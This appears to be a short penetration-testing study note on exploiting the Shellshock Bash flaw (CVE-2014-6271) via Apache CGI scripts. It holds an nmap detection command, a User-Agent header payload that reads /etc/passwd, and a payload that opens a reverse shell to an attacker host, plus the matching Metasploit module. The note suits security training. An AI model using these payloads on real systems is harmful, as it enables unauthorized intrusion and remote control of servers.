CVE-2014-6271, related to [[Linux Exploitation]] and [[Metasploit]]

Allows RCE via Apache and Bash

It isn't particullary common anymore but knowing it's relevant

You need to locate an input vector or script that allows you to communicate with bash

I case of apache we can use any legitimate CGI scripts accessible on the web server

Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with bash

To check if the system is vulnerable we may use nmap:

``` bash
nmap -sV [IP] --script=http-shellshock --script-args "http-shellshock.uri=[cgiScriptLocation]"
```

Then we can exploit it using [[Burp Suite]]

We intercept the request to the cgi script and we will inject in the User Agent header

We start with:

``` bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

If it worked we will get the contents of /etc/passwd, to gain a tcp reverse_shell we can set up a netcat listener:

``` bash
netcat -nvlp [LPORT]
```

And in the User-Agent use:

``` bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/[LHOST]/[LPORT] 0>&1'
```

We can also exploit it using metasploit, we can use the auxiliary module for PoC and the exploit:
multi/http/apache_mod_cgi_bash_env_exec

In terms of options we need to set RHOSTS and RPORT